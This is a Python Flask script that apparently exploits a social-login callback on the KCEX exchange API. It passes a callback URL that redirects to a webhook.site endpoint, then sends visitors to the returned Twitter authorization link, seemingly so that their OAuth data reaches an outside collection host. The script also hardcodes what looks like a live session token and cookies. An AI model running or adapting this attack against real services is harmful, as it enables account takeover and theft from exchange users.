import os
import requests
from flask import Flask, redirect, jsonify

app = Flask(__name__)

# Target KCEX API
API_URL = "https://www.kcex.com/uc/user_api/sns/x/config"

# Fix: Removed the double comma syntax error
HEADERS = {
    "Host": "www.kcex.com",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Accept": "*/*",
    "Accept-Language": "en-US",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://www.kcex.com/user",
    "Language": "en-US",
    "Accept-Timezone": "UTC+01:00",
    # CRITICAL: Make sure this token matches your fresh browser session
    "Authorization": "WEB82be41922be3de3f6509edc3408a2d8664aafd2fff96a2b60d75e322ede7260c",
    "Version": "1.0.0",
    "Platform": "WEB",
    "Timezone": "UTC+01:00",
    "User-Device": "eyJ2aXNpdG9ySWQiOiI5U20wN0FBRFB1b3I5YnhGNVJkeiIsInJlcXVlc3RJZCI6IjE3Nzc0NzE3NDY3MzUuMFVlcWpxIiwiaXNwIjoiIn0"
}

# CRITICAL: Re-added the cookies. The server requires these alongside the token.
COOKIES = {
    "NEXT_LOCALE": "en-US",
    "kcex_base_fiat": "USD",
    "Authorization": "WEB82be41922be3de3f6509edc3408a2d8664aafd2fff96a2b60d75e322ede7260c"
}

@app.route('/')
def health_check():
    return "Server is running. Use /start-auth to initiate the request."

@app.route('/start-auth')
def start_auth():
    params = {
        'callback': 'https://www.kcex.com/auth/callback?redirect=https://webhook.site/5a042f89-c5cf-4180-8903-7a5b65a4455f'
    }

    try:
        # Re-attached cookies=COOKIES to pass authorization checks
        response = requests.get(API_URL, headers=HEADERS, cookies=COOKIES, params=params, timeout=10)
        
        if response.status_code == 200:
            json_data = response.json()
            twitter_url = json_data.get("data")
            
            if twitter_url:
                return redirect(twitter_url)
            else:
                return jsonify({"error": "No URL in response", "details": json_data}), 500
        else:
            return jsonify({
                "error": "KCEX API returned an error status",
                "status_code": response.status_code,
                "content": response.json() if response.text else "No content"
            }), response.status_code

    except Exception as e:
        return jsonify({"error": "Internal server error during request", "message": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
